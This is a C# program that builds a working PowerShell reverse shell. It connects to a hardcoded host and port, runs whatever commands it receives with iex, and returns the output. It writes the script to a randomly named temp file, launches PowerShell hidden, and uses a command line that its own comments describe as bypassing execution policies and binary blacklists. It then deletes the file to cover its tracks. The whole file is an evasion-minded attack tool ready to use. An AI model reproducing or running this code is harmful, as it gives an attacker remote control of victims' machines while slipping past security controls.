using System;
using System.Diagnostics;
using System.IO;
using System.Text;

public class Program
{
    public static void Main()
    {
        // Path to PowerShell (included to bypass blacklisted binaries)
        string PowerShellPath = "powershell.exe";

        // Function (w/ args) to Execute Script
        string MainFunctionName = "Invoke-Rev";

        // Paste Target Script Here (and optional variables hardcoded into the script)
        string IpAddress = "10.20.30.201"; // Example
        int Port = 4444; // Example

        string psScript = $@"
function Invoke-Rev {{
    Try {{
    $RevShellClient = New-Object -TypeName System.Net.Sockets.TcpClient('{IpAddress}', {Port})
    $Stream = $RevShellClient.GetStream()
    [byte[]]$DataBuffer = 0..65535 | % {{0}}
    $OutputBuffer = New-Object -TypeName System.IO.StringWriter
    [System.Console]::SetOut($OutputBuffer)
    while (($i = $Stream.Read($DataBuffer,0,$DataBuffer.Length)) -ne 0) {{
        Try {{
            $Command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($DataBuffer,0,$i)
            $CommandOutput = (iex $Command 2>&1 | Out-String)
        }} Catch {{$CommandOutput = ""$($Error[0])`n""}}
        $OutputBuffer.Write($CommandOutput)
        $PromptString = $OutputBuffer.ToString() + 'PS ' + (PWD).Path + '> '
        $PromptBytes = ([Text.Encoding]::ASCII).GetBytes($PromptString)
        $Stream.Write($PromptBytes,0,$PromptBytes.Length)
        $Stream.Flush()
        $OutputBuffer.GetStringBuilder().Clear() | Out-Null
    }}
    $OutputBuffer.Close()
    $RevShellClient.Close()
    }}
    Catch {{
        $ErrorMessage = $Error[0]
        echo ""[-] Reverse shell was unsuccessful. Error Message: `n$ErrorMessage""
    }}
}}
";

        psScript = psScript + MainFunctionName;
        RunPowerShellScript(psScript, PowerShellPath);
    }

    // Example Output: dozdbwop.jpk
    static string GetRandomFileName()
    {
        Random rand = new Random();
        StringBuilder sb = new StringBuilder();
        int length = rand.Next(8, 13);

        for (int i = 0; i < length; i++)
        {
            sb.Append((char)rand.Next('a', 'z' + 1));
        }

        sb.Append(".");

        for (int i = 0; i < 3; i++)
        {
            sb.Append((char)rand.Next('a', 'z' + 1));
        }

        return sb.ToString();
    }

    static void RunPowerShellScript(string Script, string PowerShellPath)
    {
        string tempScriptPath = Path.Combine(Path.GetTempPath(), GetRandomFileName());
        File.WriteAllText(tempScriptPath, Script);
        Console.WriteLine("[+] Script Path: " + tempScriptPath);

        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = PowerShellPath;

        // Arguments : -WindowStyle Hidden -Command <command> 
        // Command   : Invoke-Expression ([string](Get-Content '<temp_script_path>' | % { Write-Output "$_`n" }))
        // Note      : Above command bypasses execution policies, command length, and file extensions.

        psi.Arguments = "-wi h -c (iex ([string](gc '" + tempScriptPath + "' | % { echo \"$_`n`\" })))";
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;

        using (Process process = new Process())
        {
            process.StartInfo = psi;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();
            process.WaitForExit();

            Console.WriteLine(output);
            if (!string.IsNullOrEmpty(error))
            {
                Console.WriteLine("[+] Error: " + error);
            }
        }

        // Remove Temp Script
        File.Delete(tempScriptPath);
    }
}
